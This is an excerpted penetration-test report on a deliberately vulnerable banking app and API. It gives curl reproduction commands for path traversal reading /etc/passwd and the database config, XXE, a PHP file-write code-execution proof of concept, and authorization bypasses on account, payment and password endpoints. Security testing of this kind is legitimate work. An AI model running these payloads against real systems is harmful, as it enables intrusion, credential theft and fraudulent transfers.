...
| Item | Detail |
|---|---|
| Target (web) | `http://139.59.15.10:3000/` (nginx, React SPA "UnSAFE Bank") |
| Target (API) | `http://139.59.15.10/` (Apache 2.4.33 / PHP 7.2.7, CodeIgniter 3 REST API) |
| Operator host | `root@143.244.130.163` (DigitalOcean BLR1, egress IP 143.244.130.163) |
...
**Authorization note.** The brief's template referenced `example.com` / `api.example.com`, while the actual in-scope assets are the IP `139.59.15.10`. The engagement lead confirmed ownership/authorization for `139.59.15.10` before active testing began. Mail ports `25/465/587` were treated as out-of-scope mail infrastructure and were not tested.

## 2. Scope and rules of engagement

**In scope:** `http://139.59.15.10/` (API, TCP/80) and `http://139.59.15.10:3000/` (web, TCP/3000).
...
- **Reproduction:**
  ```bash
  curl -sS --path-as-is "http://139.59.15.10/api/Show?file=../../../../../../../../etc/passwd"
  curl -sS --path-as-is "http://139.59.15.10/api/Show?file=api/application/config/database.php"
  ```
...
- **Reproduction:**
  ...
  curl -sS -H "Accept: application/xml" -H "Content-Type: application/xml" \
       --data-binary @xxe.xml http://139.59.15.10/api/ContactUs
  ```
...
- **Reproduction (performed on a test account):**
  ...
  curl -s -H 'Content-Type: application/json' --data \
   ...
   http://139.59.15.10/api/Password/forgot          # -> data.response (base64 AES ciphertext)
...
- **Reproduction (self-deleting PoC — nothing persisted):** send a serialized `LogWrite` with `logfile=../../../ub_poc.php` and `logdata=<?php echo 'NONCE'; @unlink(__FILE__); ?>`, then request the written file.
  ...
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   ...
   http://139.59.15.10/api/Loan/apply
  curl -s "http://139.59.15.10/ub_poc.php"     # -> UBSAFE_POC_<ts>_OK ; file deletes itself
  ```
...
- **Reproduction:**
  ...
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   ...
   http://139.59.15.10/api/Account/details
  ```
...
- **Reproduction:**
  ...
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   ...
   http://139.59.15.10/api/Beneficiary/fetch
...
- **Reproduction (performed between two disposable accounts only):** add a beneficiary, obtain a purpose-3 OTP, then:
  ...
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   ...
   http://139.59.15.10/api/Beneficiary/pay
  ```
...
- **Reproduction:**
  ...
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   ...
   http://139.59.15.10/api/Password/change
  ```
...
- **Assets:** `http://139.59.15.10/info.php`, API error output, `:3000` source maps
- **CWE-200 / CWE-16**
- **Detail:**
